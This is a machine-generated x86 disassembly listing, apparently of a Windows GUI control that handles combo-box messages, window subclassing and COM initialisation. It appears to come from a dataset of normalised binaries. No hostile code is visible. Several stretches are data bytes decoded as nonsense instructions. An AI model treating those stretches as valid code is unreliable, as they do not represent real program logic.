mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43c704
push ebx
mov ebx eax
mov eax ebx
call sub_42fc68
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_42fe60
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43c738
push ebx
mov ebx eax
mov eax ebx
call sub_42fc84
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_42fe60
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43c78c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_42fc90
mov eax ebx
call sub_418f90
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43c7bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4190b8
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_43c81c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_43c810
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_418f90
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43c898
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4194f0
mov ebp eax
mov esi ebx
mov eax edi
call sub_4192f0
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_43c8d0
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_403f50
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419600
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_418f90
push eax
push 0x144
mov eax esi
call sub_419600
call sub_45071c
push eax
call SendMessageA
sub_43c944
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402b5c
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419600
call sub_45071c
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_43c884
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_404410
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_418f90
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_404210
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419600
call sub_45071c
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419600
call sub_45071c
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43cab0
mov edx cs
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
0x43
sub_43cad0
sbb [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
test [ ebx ] dh
inc eax
add [ eax + ebx * 2 ] bh
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
pop eax
pop eax
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax 0x6d6f4354
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ecx + 0x27883 ] cl
js r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
test [ ebp + 0x43 ] cl
add al ch
pop ebx
or eax [ eax ]
add [ ebx - 0x743c7430 ] cl
or bh bh
xchg ecx eax
or al 0x1
add [ eax ] al
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
cld
push 0x45
add al ch
popfd
cld
dec [ ebx + 0x7cb389f0 ]
add al [ eax ]
add [ ecx + 0x46c70c5e ] cl
or [ esi + ecx * 8 ] cl
inc ebx
add dh al
or [ ecx + 0x2 ] 0xffffffa0
sbb ah cl
inc ebx
add [ eax + 0x26c83 ] cl
add [ eax + 0x489afc3d ] al
add [ eax ] al
je r-xdata
call sub_403124
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43ce0c
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
add [ ecx + r-xdata ] esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ esi + 0x70 ] al
0x43
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_4351b4
mov ecx esi
xor edx edx
mov eax ebx
call sub_4422cc
push ebx
push sub_43cfb0
call sub_460980
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d6b8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
add esp 0xfffffff0
call sub_4034a0
sub_43cc37
add [ ebx + 0x56 ] dl
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403154
lea eax [ esi + 0x27c ]
call sub_40d130
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_460994
lea eax [ esi + 0x284 ]
call sub_40d130
lea eax [ esi + 0x268 ]
call sub_4057bc
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4423c0
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_43ccb0
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_43cd00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_435188
mov edx ebx
mov eax esi
call sub_44d5a8
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44d4d4
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43cd78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_457920
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_42109c
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44afd4
mov eax ebx
call sub_44dcbc
mov eax [ ebx + 0x280 ]
call sub_456f90
push eax
push 0x0
push 0x402
mov eax ebx
call sub_45071c
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_43ce0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456f90
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44afd4
sub_43ce38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_4429fc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424828
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43ce80
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4492f0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43cd78
sub_43ceb0
push ebx
mov ebx eax
mov eax ebx
call sub_44b9f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ced8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44fc50
mov eax ebx
call sub_450a20
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_43cf38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44b4a4
mov eax ebx
call sub_44a048
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_460ae8
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44a4c8
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44a058
sub_43cfd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d2e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_442d64
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_43d1e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4192f0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_43d31c
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4057bc
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4057bc
push eax
push sub_43d2f0
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_456f90
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d130
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_449f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d2ea
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dbbc
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057d4
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43d4b0
sub edx 0xffffffec
sub_43d31c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_450a20
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_45071c
push eax
call SendMessageA
sub_43d37c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4511a8
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43cd78
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43d3e0
push ebx
mov ebx eax
mov eax ebx
call sub_442f4c
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_44dcbc
sub_43d424
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_4192f0
test eax eax
jle r-xdata
mov eax ebx
call sub_44dab8
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4190e8
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43d474
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43d4b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43d5ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_450a20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d5b4
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057bc
mov ecx eax
mov edx sub_43d5b8
mov eax [ ebx + 0x268 ]
call sub_40d140
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_43d5b8
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
mov ecx [ eax + 0x220 ]
mov [ edx ] ecx
mov ecx [ eax + 0x224 ]
mov [ edx + 0x4 ] ecx
retn
sub_43d5fc
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43c810
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_418f90
pop esi
pop ebx
retn
sub_43d620
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43c810
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_418f90
pop edi
pop esi
pop ebx
retn
sub_43d650
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43d6ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41924c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_450a20
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d6b5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44dcbc
sub_43d6b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_42fe6c
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43d714
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419680
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_43d750
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d88d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403fe8
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_42fe34
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d894
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_43d89c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403fa4
pop edi
pop esi
pop ebx
retn
sub_43d8f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_42fe34
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_407edc
test eax eax
jne r-xdata
sub_43d958
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42fe34
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_43d978
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_43d9a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_450a20
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
